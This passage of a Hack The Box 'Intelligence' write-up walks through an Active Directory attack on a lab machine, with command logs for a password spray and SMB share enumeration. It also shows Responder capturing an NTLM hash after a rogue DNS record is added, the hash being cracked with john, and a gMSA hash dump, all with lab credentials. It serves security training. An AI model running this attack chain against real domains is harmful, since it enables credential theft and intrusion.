10.10.10.248    445    DC               [-] intelligence.htb\Thomas.Valenzuela:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE </span><br><span class="line">SMB         10.10.10.248    445    DC               [-] intelligence.htb\David.Reed:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE </span><br><span class="line">SMB         10.10.10.248    445    DC               [-] intelligence.htb\Kaitlyn.Zimmerman:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE </span><br><span class="line">SMB         10.10.10.248    445    DC               [-] intelligence.htb\Jason.Patterson:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE </span><br><span class="line">SMB         10.10.10.248    445    DC               [-] intelligence.htb\Thomas.Valenzuela:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE </span><br><span class="line">SMB         10.10.10.248    445    DC               [-] intelligence.htb\David.Mcbride:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE </span><br><span class="line">SMB         10.10.10.248    445    DC               [-] intelligence.htb\Darryl.Harris:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE </span><br><span class="line">SMB         10.10.10.248    445    DC               [-] intelligence.htb\William.Lee:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE </span><br><span class="line">SMB         10.10.10.248    445    DC               [-] intelligence.htb\Stephanie.Young:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE </span><br><span class="line">SMB         10.10.10.248    445    DC               [-] intelligence.htb\David.Reed:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE </span><br><span class="line">SMB         10.10.10.248    445    DC               [-] intelligence.htb\Nicole.Brock:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE </span><br><span class="line">SMB         10.10.10.248    445    DC               [-] intelligence.htb\David.Mcbride:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE </span><br><span class="line">SMB         10.10.10.248    445    DC               [-] intelligence.htb\William.Lee:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE </span><br><span class="line">SMB         10.10.10.248    445    DC               [-] intelligence.htb\Stephanie.Young:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE </span><br><span class="line">SMB         10.10.10.248    445    DC               [-] intelligence.htb\John.Coleman:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE </span><br><span class="line">SMB         10.10.10.248    445    DC               [-] intelligence.htb\David.Wilson:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE </span><br><span class="line">SMB         10.10.10.248    445    DC               [-] intelligence.htb\Scott.Scott:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE </span><br><span class="line">SMB         10.10.10.248    445    DC               [-] intelligence.htb\Teresa.Williamson:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE </span><br><span class="line">SMB         10.10.10.248    445    DC               [-] intelligence.htb\John.Coleman:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE </span><br><span class="line">SMB         10.10.10.248    445    DC               [-] intelligence.htb\Veronica.Patel:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE </span><br><span class="line">SMB         10.10.10.248    445    DC               [-] intelligence.htb\John.Coleman:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE </span><br><span class="line">SMB         10.10.10.248    445    DC               [-] intelligence.htb\Samuel.Richardson:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE </span><br><span class="line">SMB         10.10.10.248    445    DC               [-] intelligence.htb\Ian.Duncan:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE </span><br><span class="line">SMB         10.10.10.248    445    DC               [-] intelligence.htb\Nicole.Brock:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE </span><br><span class="line">SMB         10.10.10.248    445    DC               [-] intelligence.htb\William.Lee:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE </span><br><span class="line">SMB         10.10.10.248    445    DC               [-] intelligence.htb\Jason.Wright:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE </span><br><span class="line">SMB         10.10.10.248    445    DC               [-] intelligence.htb\Travis.Evans:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE </span><br><span class="line">SMB         10.10.10.248    445    DC               [-] intelligence.htb\David.Mcbride:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE </span><br><span class="line">SMB         10.10.10.248    445    DC               [-] intelligence.htb\Jessica.Moody:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE </span><br><span class="line">SMB         10.10.10.248    445    DC               [-] intelligence.htb\Ian.Duncan:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE </span><br><span class="line">SMB         10.10.10.248    445    DC               [-] intelligence.htb\Jason.Wright:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE </span><br><span class="line">SMB         10.10.10.248    445    DC               [-] intelligence.htb\Richard.Williams:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE </span><br><span class="line">SMB         10.10.10.248    445    DC               [+] intelligence.htb\Tiffany.Molina:NewIntelligenceCorpUser9876</span><br></pre></td></tr></table></figure>
<p>Look like we have password for Tiffany.Molina</p>
<h2 id="smbmap"><a href="#smbmap" class="headerlink" title="smbmap"></a>smbmap</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line">[\] Working on it...</span><br><span class="line">[+] IP: intelligence.htb:445	Name: unknown                                           </span><br><span class="line">[-] Working on it...</span><br><span class="line">                                </span><br><span class="line">	Disk                                                  	Permissions	Comment</span><br><span class="line">	----                                                  	-----------	-------</span><br><span class="line">	ADMIN$                                            	NO ACCESS	Remote Admin</span><br><span class="line">	C$                                                	NO ACCESS	Default share</span><br><span class="line">	IPC$                                              	READ ONLY	Remote IPC</span><br><span class="line">	.\IPC$\*</span><br><span class="line">	fr--r--r--                3 Sun Dec 31 23:58:45 1600	InitShutdown</span><br><span class="line">	fr--r--r--                4 Sun Dec 31 23:58:45 1600	lsass</span><br><span class="line">	fr--r--r--                3 Sun Dec 31 23:58:45 1600	ntsvcs</span><br><span class="line">	fr--r--r--                3 Sun Dec 31 23:58:45 1600	scerpc</span><br><span class="line">	fr--r--r--                1 Sun Dec 31 23:58:45 1600	Winsock2\CatalogChangeListener-39c-0</span><br><span class="line">	fr--r--r--                3 Sun Dec 31 23:58:45 1600	epmapper</span><br><span class="line">	fr--r--r--                1 Sun Dec 31 23:58:45 1600	Winsock2\CatalogChangeListener-1b8-0</span><br><span class="line">	fr--r--r--                3 Sun Dec 31 23:58:45 1600	LSM_API_service</span><br><span class="line">	fr--r--r--                3 Sun Dec 31 23:58:45 1600	eventlog</span><br><span class="line">	fr--r--r--                1 Sun Dec 31 23:58:45 1600	Winsock2\CatalogChangeListener-394-0</span><br><span class="line">	fr--r--r--                3 Sun Dec 31 23:58:45 1600	atsvc</span><br><span class="line">	fr--r--r--                4 Sun Dec 31 23:58:45 1600	wkssvc</span><br><span class="line">	fr--r--r--                1 Sun Dec 31 23:58:45 1600	Winsock2\CatalogChangeListener-258-0</span><br><span class="line">	fr--r--r--                1 Sun Dec 31 23:58:45 1600	Winsock2\CatalogChangeListener-4e8-0</span><br><span class="line">	fr--r--r--                1 Sun Dec 31 23:58:45 1600	Winsock2\CatalogChangeListener-258-1</span><br><span class="line">	fr--r--r--                3 Sun Dec 31 23:58:45 1600	RpcProxy\49677</span><br><span class="line">	fr--r--r--                3 Sun Dec 31 23:58:45 1600	01c597a227e270af</span><br><span class="line">	fr--r--r--                3 Sun Dec 31 23:58:45 1600	RpcProxy\593</span><br><span class="line">	fr--r--r--                5 Sun Dec 31 23:58:45 1600	srvsvc</span><br><span class="line">	fr--r--r--                3 Sun Dec 31 23:58:45 1600	efsrpc</span><br><span class="line">	fr--r--r--                3 Sun Dec 31 23:58:45 1600	netdfs</span><br><span class="line">	fr--r--r--                1 Sun Dec 31 23:58:45 1600	vgauth-service</span><br><span class="line">	fr--r--r--                1 Sun Dec 31 23:58:45 1600	Winsock2\CatalogChangeListener-240-0</span><br><span class="line">	fr--r--r--                3 Sun Dec 31 23:58:45 1600	W32TIME_ALT</span><br><span class="line">	fr--r--r--                3 Sun Dec 31 23:58:45 1600	cert</span><br><span class="line">	fr--r--r--                1 Sun Dec 31 23:58:45 1600	Winsock2\CatalogChangeListener-9f0-0</span><br><span class="line">	fr--r--r--                1 Sun Dec 31 23:58:45 1600	Winsock2\CatalogChangeListener-a7c-0</span><br><span class="line">	fr--r--r--                1 Sun Dec 31 23:58:45 1600	PIPE_EVENTROOT\CIMV2SCM EVENT PROVIDER</span><br><span class="line">	fr--r--r--                1 Sun Dec 31 23:58:45 1600	Winsock2\CatalogChangeListener-a50-0</span><br><span class="line">	IT                                                	READ ONLY	</span><br><span class="line">	.\IT\*</span><br><span class="line">	dr--r--r--                0 Mon Apr 19 01:50:58 2021	.</span><br><span class="line">	dr--r--r--                0 Mon Apr 19 01:50:58 2021	..</span><br><span class="line">	fr--r--r--             1046 Mon Apr 19 01:50:58 2021	downdetector.ps1</span><br><span class="line">	NETLOGON                                          	READ ONLY	Logon server share </span><br><span class="line">	.\NETLOGON\*</span><br><span class="line">	dr--r--r--                0 Mon Apr 19 01:42:14 2021	.</span><br><span class="line">	dr--r--r--                0 Mon Apr 19 01:42:14 2021	..</span><br><span class="line">	SYSVOL                                            	READ ONLY	Logon server share </span><br><span class="line">	.\SYSVOL\*</span><br><span class="line">	dr--r--r--                0 Mon Apr 19 01:42:14 2021	.</span><br><span class="line">	dr--r--r--                0 Mon Apr 19 01:42:14 2021	..</span><br><span class="line">	dr--r--r--                0 Mon Apr 19 01:42:14 2021	intelligence.htb</span><br><span class="line">	Users                                             	READ ONLY	</span><br><span class="line">	.\Users\*</span><br><span class="line">	dw--w--w--                0 Mon Apr 19 02:20:26 2021	.</span><br><span class="line">	dw--w--w--                0 Mon Apr 19 02:20:26 2021	..</span><br><span class="line">	dr--r--r--                0 Mon Apr 19 01:18:39 2021	Administrator</span><br><span class="line">	dr--r--r--                0 Mon Apr 19 04:16:30 2021	All Users</span><br><span class="line">	dw--w--w--                0 Mon Apr 19 03:17:40 2021	Default</span><br><span class="line">	dr--r--r--                0 Mon Apr 19 04:16:30 2021	Default User</span><br><span class="line">	fr--r--r--              174 Mon Apr 19 04:15:17 2021	desktop.ini</span><br><span class="line">	dw--w--w--                0 Mon Apr 19 01:18:39 2021	Public</span><br><span class="line">	dr--r--r--                0 Mon Apr 19 02:20:26 2021	Ted.Graves</span><br><span class="line">	dr--r--r--                0 Mon Apr 19 01:51:46 2021	Tiffany.Molina</span><br></pre></td></tr></table></figure>

<p>We have access to few of the shares so let’s try and access those.</p>
<h2 id="User-txt"><a href="#User-txt" class="headerlink" title="User.txt"></a>User.txt</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">┌──(root💀kali)-[~/hackthebox/machine/intelligence]</span><br><span class="line">└─<span class="comment"># smbclient //intelligence.htb/Users -U &#x27;Tiffany.Molina&#x27;</span></span><br><span class="line">Enter WORKGROUP\Tiffany.Molina<span class="string">&#x27;s password: </span></span><br><span class="line"><span class="string">Try &quot;help&quot; to get a list of possible commands.</span></span><br><span class="line"><span class="string">smb: \&gt; cd Tiffany.Molina\Desktop\</span></span><br><span class="line"><span class="string">smb: \Tiffany.Molina\Desktop\&gt; get user.txt</span></span><br><span class="line"><span class="string">getting file \Tiffany.Molina\Desktop\user.txt of size 34 as user.txt (0.0 KiloBytes/sec) (average 0.0 KiloBytes/sec)</span></span><br><span class="line"><span class="string">smb: \Tiffany.Molina\Desktop\&gt; quit</span></span><br><span class="line"><span class="string">┌──(root💀kali)-[~/hackthebox/machine/intelligence]</span></span><br><span class="line"><span class="string">└─# cat user.txt </span></span><br><span class="line"><span class="string">6fd023d238f2d2a63ecb521504fc1dd3</span></span><br></pre></td></tr></table></figure>
<p>Now you have user.txt</p>
<ul>
<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb2013.jpg"></li>
</ul>
<h1 id="PrivESC"><a href="#PrivESC" class="headerlink" title="PrivESC"></a>PrivESC</h1><h2 id="Enumeration-1"><a href="#Enumeration-1" class="headerlink" title="Enumeration"></a>Enumeration</h2><p>The share that looked intresting to me was IT, so let’s look into that.</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">┌──(root💀kali)-[~/hackthebox/machine/intelligence]</span><br><span class="line">└─<span class="comment"># smbclient //intelligence.htb/IT -U &#x27;Tiffany.Molina&#x27;</span></span><br><span class="line">Enter WORKGROUP\Tiffany.Molina<span class="string">&#x27;s password: </span></span><br><span class="line"><span class="string">Try &quot;help&quot; to get a list of possible commands.</span></span><br><span class="line"><span class="string">smb: \&gt; ls</span></span><br><span class="line"><span class="string">  .                                   D        0  Sun Apr 18 20:50:55 2021</span></span><br><span class="line"><span class="string">  ..                                  D        0  Sun Apr 18 20:50:55 2021</span></span><br><span class="line"><span class="string">  downdetector.ps1                    A     1046  Sun Apr 18 20:50:55 2021</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">                3770367 blocks of size 4096. 1463495 blocks available</span></span><br><span class="line"><span class="string">smb: \&gt; get downdetector.ps1</span></span><br><span class="line"><span class="string">getting file \downdetector.ps1 of size 1046 as downdetector.ps1 (1.3 KiloBytes/sec) (average 1.3 KiloBytes/sec)</span></span><br></pre></td></tr></table></figure>

<p>Looks like we have a powershell script let’s explore it.</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Check web server status. Scheduled to run every 5min</span></span><br><span class="line"><span class="built_in">Import-Module</span> ActiveDirectory </span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$record</span> <span class="keyword">in</span> <span class="built_in">Get-ChildItem</span> <span class="string">&quot;AD:DC=intelligence.htb,CN=MicrosoftDNS,DC=DomainDnsZones,DC=intelligence,DC=htb&quot;</span> | <span class="built_in">Where-Object</span> Name <span class="operator">-like</span> <span class="string">&quot;web*&quot;</span>)  &#123;</span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line"><span class="variable">$request</span> = <span class="built_in">Invoke-WebRequest</span> <span class="literal">-Uri</span> <span class="string">&quot;http://<span class="variable">$</span>(<span class="variable">$record</span>.Name)&quot;</span> <span class="literal">-UseDefaultCredentials</span></span><br><span class="line"><span class="keyword">if</span>(.StatusCode <span class="operator">-ne</span> <span class="number">200</span>) &#123;</span><br><span class="line"><span class="built_in">Send-MailMessage</span> <span class="literal">-From</span> <span class="string">&#x27;Ted Graves &lt;Ted.Graves@intelligence.htb&gt;&#x27;</span> <span class="literal">-To</span> <span class="string">&#x27;Ted Graves &lt;Ted.Graves@intelligence.htb&gt;&#x27;</span> <span class="literal">-Subject</span> <span class="string">&quot;Host: <span class="variable">$</span>(<span class="variable">$record</span>.Name) is down&quot;</span></span><br><span class="line">&#125;</span><br><span class="line">&#125; <span class="keyword">catch</span> &#123;&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>Looks like we have the cronjob kind of thing running every five minutes we can see that it makes a request to webserver if we can bypass the check for validation which will be pretty easy as it uses web* as validation so not much problem there.</p>
<p>Now so I think that if we can add a dns in the record we can get the Ted.Graves hash using responder.</p>
<p>Basically the login behind this is simple we add the dns record and then the Ted will see if that record responds back or not and as soon as Ted checks that record we will get his hash in responder.</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line">kali@kali:~/HackTheBox/Intelligence$ sudo python /usr/share/responder/Responder.py -I tun0 -A                                                                         </span><br><span class="line">                                         __                                                                                                                           </span><br><span class="line">  .----.-----.-----.-----.-----.-----.--|  |.-----.----.                                                                                                              </span><br><span class="line">  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|                                                                                                              </span><br><span class="line">  |__| |_____|_____|   __|_____|__|__|_____||_____|__|                                                                                                                </span><br><span class="line">                   |__|                                                                                                                                               </span><br><span class="line"> </span><br><span class="line">           NBT-NS, LLMNR &amp; MDNS Responder 3.0.2.0                 </span><br><span class="line">  Author: Laurent Gaffie (laurent.gaffie@gmail.com)</span><br><span class="line">  To <span class="built_in">kill</span> this script hit CTRL-C </span><br><span class="line">/!\ Warning: files/AccessDenied.html: file not found</span><br><span class="line">/!\ Warning: files/BindShell.exe: file not found                                                                                                                      </span><br><span class="line"> </span><br><span class="line">[+] Poisoners:</span><br><span class="line">    LLMNR                      [ON]</span><br><span class="line">    NBT-NS                     [ON]</span><br><span class="line">    DNS/MDNS                   [ON]</span><br><span class="line">	</span><br><span class="line">[+] Servers:</span><br><span class="line">    HTTP server                [ON]</span><br><span class="line">    HTTPS server               [ON]</span><br><span class="line">    WPAD proxy                 [OFF]</span><br><span class="line">    Auth proxy                 [OFF]</span><br><span class="line">    SMB server                 [ON]</span><br><span class="line">    Kerberos server            [ON]</span><br><span class="line">    SQL server                 [ON]</span><br><span class="line">    FTP server                 [ON]</span><br><span class="line">    IMAP server                [ON]</span><br><span class="line">	POP3 server                [ON] </span><br><span class="line">    SMTP server                [ON]</span><br><span class="line">    DNS server                 [ON]</span><br><span class="line">    LDAP server                [ON]</span><br><span class="line">    RDP server                 [ON]</span><br><span class="line"></span><br><span class="line">[+] HTTP Options:</span><br><span class="line">    Always serving EXE         [OFF]</span><br><span class="line">    Serving EXE                [OFF]</span><br><span class="line">    Serving HTML               [OFF]</span><br><span class="line">    Upstream Proxy             [OFF]</span><br><span class="line"></span><br><span class="line">[+] Poisoning Options:</span><br><span class="line">    Analyze Mode               [ON]</span><br><span class="line">    Force WPAD auth            [OFF]</span><br><span class="line">    Force Basic Auth           [OFF]</span><br><span class="line">    Force LM downgrade         [OFF]</span><br><span class="line">    Fingerprint hosts          [OFF]</span><br><span class="line"></span><br><span class="line">[+] Generic Options:</span><br><span class="line">    Responder NIC              [tun0]</span><br><span class="line">    Responder IP               [10.10.14.14]</span><br><span class="line">    Challenge <span class="built_in">set</span>              [1122334455667788]</span><br><span class="line">    Don<span class="string">&#x27;t Respond To Names     [&#x27;</span>ISATAP<span class="string">&#x27;]</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[i] Responder is in analyze mode. No NBT-NS, LLMNR, MDNS requests will be poisoned.</span></span><br><span class="line"><span class="string">[Analyze mode: ICMP] You can ICMP Redirect on this network.</span></span><br><span class="line"><span class="string">[Analyze mode: ICMP] This workstation (10.10.14.14) is not on the same subnet than the DNS server (&lt;--SNIP---&gt;).</span></span><br><span class="line"><span class="string">[Analyze mode: ICMP] Use `python tools/Icmp-Redirect.py` for more details.</span></span><br><span class="line"><span class="string">[Analyze mode: ICMP] You can ICMP Redirect on this network.</span></span><br><span class="line"><span class="string">[Analyze mode: ICMP] This workstation (10.10.14.14) is not on the same subnet than the DNS server (&lt;---SNIP----&gt;).</span></span><br><span class="line"><span class="string">[Analyze mode: ICMP] Use `python tools/Icmp-Redirect.py` for more details.</span></span><br><span class="line"><span class="string">[+] Listening for events..</span></span><br></pre></td></tr></table></figure>

<p>Now let’s try and use dnstool to deal with DNS records.<br>you can find the dnstool over here.</p>
<ul>
<li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2RpcmtqYW5tL2tyYnJlbGF5eC5naXQ=">krbrelayx<i class="fa fa-external-link-alt"></i></span></li>
</ul>
<p>You can install it like below.</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">kali@kali:~/HackTheBox/Intelligence$ git <span class="built_in">clone</span> https://github.com/dirkjanm/krbrelayx.git</span><br><span class="line">Cloning into <span class="string">&#x27;krbrelayx&#x27;</span>...</span><br><span class="line">remote: Enumerating objects: 98, <span class="keyword">done</span>.</span><br><span class="line">remote: Total 98 (delta 0), reused 0 (delta 0), pack-reused 98</span><br><span class="line">Unpacking objects: 100% (98/98), 65.74 KiB | 474.00 KiB/s, <span class="keyword">done</span>.</span><br><span class="line">kali@kali:~/HackTheBox/Intelligence$ <span class="built_in">cd</span> krbrelayx/</span><br><span class="line">kali@kali:~/HackTheBox/Intelligence/krbrelayx$ <span class="built_in">ls</span></span><br><span class="line">addspn.py  dnstool.py  krbrelayx.py  lib  LICENSE  printerbug.py  README.md</span><br><span class="line">┌──(root💀kali)-[~/krbrelayx]</span><br><span class="line">└─<span class="comment"># python3 dnstool.py -u &#x27;intelligence.htb\Tiffany.Molina&#x27; -p &#x27;NewIntelligenceCorpUser9876&#x27; -a add -r &#x27;weboops.intelligence.htb&#x27; -d 10.10.14.6 10.10.10.248</span></span><br><span class="line">[-] Connecting to host...</span><br><span class="line">[-] Binding to host</span><br><span class="line">[+] Bind OK</span><br><span class="line">/root/krbrelayx/dnstool.py:241: DeprecationWarning: please use dns.resolver.Resolver.resolve() instead</span><br><span class="line">  res = dnsresolver.query(zone, <span class="string">&#x27;SOA&#x27;</span>)</span><br><span class="line">[-] Adding new record</span><br><span class="line">[+] LDAP operation completed successfully</span><br></pre></td></tr></table></figure>

<p>Now we our record in DNS so let’s wait for hash in responder.<br>Note this may take up to 5 mins so be patient.</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[HTTP] NTLMv2 Client   : 10.10.10.248</span><br><span class="line">[HTTP] NTLMv2 Username : intelligence\Ted.Graves</span><br><span class="line">[HTTP] NTLMv2 Hash     : Ted.Graves::intelligence:37c9f1a5fd8546ff:1E0D7AFAA686BD619EA26FDB77D8DCD8:010100000000000063FBFF768775D7010792963655F4E95300000000020008004200310054004B0001001E00570049004E002D00320034004800500058004900390058004C0036004B00040014004200310054004B002E004C004F00430041004C0003003400570049004E002D00320034004800500058004900390058004C0036004B002E004200310054004B002E004C004F00430041004C00050014004200310054004B002E004C004F00430041004C0008003000300000000000000000000000002000009B97627A224CC43FDB02F82503B8A278F65DE3C1A1FAE4A1DC244143C2FF45020A0010000000000000000000000000000000000009003A0048005400540050002F007700650062006F006F00700073002E0069006E00740065006C006C006900670065006E00630065002E006800740062000000000000000000</span><br></pre></td></tr></table></figure>

<p>Now we have the hash for Ted.Graves let’s try and crack it.<br>Over here I have used john you can also use hashcat for the same and there are also online cracker if you prefer that.</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">kali@kali:~/HackTheBox/Intelligence/krbrelayx$ sudo john <span class="built_in">hash</span> --wordlist=/usr/share/wordlists/rockyou.txt</span><br><span class="line">[sudo] password <span class="keyword">for</span> kali: </span><br><span class="line">Using default input encoding: UTF-8</span><br><span class="line">Loaded 1 password <span class="built_in">hash</span> (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64])</span><br><span class="line">Will run 2 OpenMP threads</span><br><span class="line">Press <span class="string">&#x27;q&#x27;</span> or Ctrl-C to abort, almost any other key <span class="keyword">for</span> status</span><br><span class="line">Mr.Teddy         (Ted.Graves)</span><br><span class="line">1g 0:00:00:23 DONE (2021-07-04 18:17) 0.04170g/s 450978p/s 450978c/s 450978C/s Mrz.deltasigma..Mr BOB</span><br><span class="line">Use the <span class="string">&quot;--show --format=netntlmv2&quot;</span> options to display all of the cracked passwords reliably</span><br><span class="line">Session completed</span><br></pre></td></tr></table></figure>

<p>Now we have the password for Ted.Graves<br>So let’s enumerate the ldap as we already know we don’t have much on share.<br>I got this tool from the link</p>
<ul>
<li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL21pY2FodmFuZGV1c2VuL2dNU0FEdW1wZXI=">gMSADumper<i class="fa fa-external-link-alt"></i></span></li>
</ul>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">┌──(root💀kali)-[~/hackthebox/machine/intelligence/gMSADumper-main]</span><br><span class="line">└─<span class="comment"># python3 gMSADumper.py -u Ted.Graves -p Mr.Teddy -d intelligence.htb                                                           </span></span><br><span class="line">svc_int$:::d64b83fe606e6d3005e20ce0ee932fe2</span><br></pre></td></tr></table></figure>

<p>we have a hash but unfortunately it’s not in rockyou.txt</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">kali@kali:~/HackTheBox/Intelligence/gMSADumper$ sudo john new --wordlist=/usr/share/wordlists/rockyou.txt</span><br><span class="line">Using default input encoding: UTF-8</span><br><span class="line">Loaded 1 password <span class="built_in">hash</span> (NT [MD4 128/128 SSE2 4x3])</span><br><span class="line">Warning: no OpenMP support <span class="keyword">for</span> this <span class="built_in">hash</span> <span class="built_in">type</span>, consider --fork=2</span><br><span class="line">Press <span class="string">&#x27;q&#x27;</span> or Ctrl-C to abort, almost any other key <span class="keyword">for</span> status</span><br><span class="line">0g 0:00:00:04 DONE (2021-07-04 18:30) 0g/s 3431Kp/s 3431Kc/s 3431KC/s      markinho..*7¡Vamos!</span><br><span class="line">Session completed</span><br></pre></td></tr></table></figure>

<p>So now the other option is to get the kerberos ticket using that hash.<br>Famously or INFamously known as silver ticket attack on AD.<br>So you can search Silver Ticket attack on Active Directory to learn more.<br>Let’s try that.</p>
